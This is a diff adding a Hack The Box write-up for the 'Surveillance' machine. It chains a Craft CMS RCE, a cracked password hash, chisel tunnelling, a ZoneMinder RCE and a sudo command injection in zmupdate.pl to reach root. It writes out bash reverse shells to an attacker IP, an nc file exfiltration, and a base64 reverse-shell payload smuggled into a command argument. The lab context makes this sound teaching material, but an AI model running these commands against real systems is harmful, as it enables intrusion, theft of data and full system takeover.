@@ -2,7 +2,7 @@
 layout: single
 title: Survellance - Hack The Box
 excerpt: "Survellance is a medium machine of Hack The Box (HTB), the machine  begins with identifying a CMS vulnerability on the webpage hosted on port 80, which grants initial access to the system. Through enumeration, I uncovered a database file containing an encrypted password. Cracking this password allows me to access a ZoneMinder instance running on localhost. By exploiting a known vulnerability in ZoneMinder, I elevate my access to the 'zoneminder' user. The final step involves leveraging sudo privileges to achieve full root access"
-date: 2023-02-13
+date: 2024-05-27
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-survellance/Surveillance-LOGO.png
@@ -68,3 +68,140 @@ By checking the result of *whatweb* I can see from the begginning that we will b
 # FootHold
 
 I decided to check the page hosted in port 80, to see if i can find something else that can help us find out more about the CMS that we are working with .
+
+![Alt text](/assets/images/htb-writeup-survellance/surv2.png)
+
+I look for possible vulnerabilities related to craft CMS and I found a possible CVE ([CVE-2023-41892](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_unauth_rce_cve_2023_41892/)); By reading at the page I can see that Craft CMS versions between **4.0.0-RC1 - 4.4.14** are vulnerable to unauthenticated Remote Code Execution
+
+* The vulnerability lies in how Craft CMS handles functionalities like *\GuzzleHttp\Psr7\FnStream* which allows for selective method invocation. An attacker can craft a specially crafted request that triggers this functionality and injects malicious code. This code could then be written to the system's log file.
+* Since Craft CMS parses the log files for certain purposes, the *injected code can be executed unintentionally*. This grants the attacker remote code execution capabilities.
+
+After doing some research you will be able to find a working exploit in [GitHub](https://github.com/Faelian/CraftCMS_CVE-2023-41892). I just execute the program and it gave me shell access as ***www-data***
+
+```bash
+python3 craft-cms.py http://surveillance.htb/
+```
+
+![Alt text](/assets/images/htb-writeup-survellance/surv3.png)
+
+Then i tried to stablish a better shell to not depend only on the exploit to have aceess to the box
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'
+```
+while enumerating the system we can see two users (other than root) Matthew & ZoneMinder. With our current user (www-data) I found a backup directory that contains a zip file which was interesting to me because it is SQL backup file could contain some credentials or configuration information.
+
+* **Path:**  /var/www/html/craft/storage/backups
+
+I send the file to my machine to inspect it.
+
+* On receiving machine:
+```bash
+
+nc -nlvp 443  > surv.zip 
+```
+* On Sender Machine:
+
+```bash
+nc 10.10.14.13 443 < surveillance--2023-10-17-202801--v4.4.14.sql.zip
+```
+
+# Escalating to Matthew 
+
+After reading the file you can see that it is creating some DB (creating tables and inserting data) and almost at the end you can find the data being inserted to user table
+
+![Alt text](/assets/images/htb-writeup-survellance/surv4.png)
+
+From the picture above I am able to see that matthew is admin (somewhere) and I can see a long string that could be an encrypted password. To crack the hash I did it with crackstation:
+* 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
+
+![Alt text](/assets/images/htb-writeup-survellance/surv5.png)
+
+I am able to get a password match! --> **starcraft122490**
+
+![Alt text](/assets/images/htb-writeup-survellance/surv6.png)
+
+# Escalating to ZoneMinder
+
+With the access to Matthew account already stablished i decided to do some more enumeration, so i decide to check if there is anything running on *localhost ports* that can lead to a possible privigilege escalation.
+
+```bash
+netstat -tunlp
+```
+
+![Alt text](/assets/images/htb-writeup-survellance/surv7.png)
+
+I check with curl the page but it turn to be a lot of HTML code so i decided to make a port forwarding with *chisel*.
+
+```bash
+#on Attacking machine 
+./chisel_lin server -p 443 --reverse
+
+#on Victim machine
+./chisel_lin client 10.10.14.226:443 R:4444:127.0.0.1:4545
+./chisel_lin server -p 4545 --socks5
+
+#on the attacking machine 
+./chisel_lin client localhost:4444 1081:socks
+```
+![Alt text](/assets/images/htb-writeup-survellance/surv8.png)
+
+
+After stablishing the connection on my socks tunnel I am able to connect to the page hosted on localhost:8080 and that is when I realise that ***ZoneMinder*** more than an user its a service/software.
+
+![Alt text](/assets/images/htb-writeup-survellance/surv9.png)
+
+Then i look for zoneminder exploits on google and I encounter with **CVE-2023-26035**: "Unauthenticated Remote Code Execution in ZoneMinder"
+I wasn't able to find any type of information related to the version, but since it seemed a easy exploit to run i decided to give it a try. Also taking into account the year of the *CVE* it looked that it could be a possible way of attacking
+
+The vulnerability lies in the way ZoneMinder handles the "snapshot" function. This function is supposed to capture an image from a connected security camera. However, due to a missing authorization check, *an attacker can manipulate this function to create a new monitor instead of fetching an existing one*. By crafting a specially crafted request, the attacker can inject malicious code that gets executed by the ZoneMinder server.
+
+I found a working Exploit on [GitHub](https://github.com/rvizx/CVE-2023-26035):
+
+```bash
+proxychains python3 exploit-zone.py -t http://127.0.0.1:8080/ -ip 10.10.14.13 -p 445
+```
+***NOTE:*** This exploit did worked for me but for some reason not all the times, I had to ran it like 2-3 times for it to give me shell.
+
+![Alt text](/assets/images/htb-writeup-survellance/surv10.png)
+
+
+# Escalating to Root
+I check if I have any sudo privileges with "ZoneMinder" user
+
+![Alt text](/assets/images/htb-writeup-survellance/surv11.png)
+
+so apparently i can run as sudo anything that is on /usr/bin and the *name starts with zm and ends in .pl* . I try to read the files but they are extremelly long to read each single one. i look online for *"escalate priviles zoneminder zm.pl"* and i found an interesting [GitHub](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-h5m9-6jjc-cgmw) page talking about something related.
+
+The Security advisory basically says that this is affecting version < 1.36.33. I check our working version, since I did not knew if it was affected by the issue mentioned before
+
+```bash
+dpkg -s zoneminder | grep Version
+```
+
+This command is used to check the version of a specific package installed on your system, in this specific case "zoneminder".
+![Alt text](/assets/images/htb-writeup-survellance/surv12.png)
+
+I check for config files of zoneminder and in found /etc/zm and it seems i can see its password in  **clear text!**
+
+![Alt text](/assets/images/htb-writeup-survellance/surv13.png)
+
+* ZoneMinderPassword2023
+
+After reading for a while the codes and not finding much i encounter this code snippet from **zmupdate.pl**
+
+![Alt text](/assets/images/htb-writeup-survellance/surv14.png)
+
+the important part of this code is that the *user input is being put straight into the next sql (bash connection query)* so we can alter its behaviour; For this I encoded the following code in base64.
+
+```bash
+echo  "bash -c 'bash -i >& /dev/tcp/10.10.14.35/443 0>&1' " | base64 -w0 
+```
+NOW I TRY TO send the payload
+
+```bash
+sudo /usr/bin/zmupdate.pl -v 1.19.0 -u ';echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy8xMjM0IDA+JjEnIAo=" |base64 -d |bash;'
+```
+Since user input is going dirrectly into a bash connection query we can send some code in bash that will alter the behaviour and will alow us to get root
+
+![Alt text](/assets/images/htb-writeup-survellance/surv15.png)
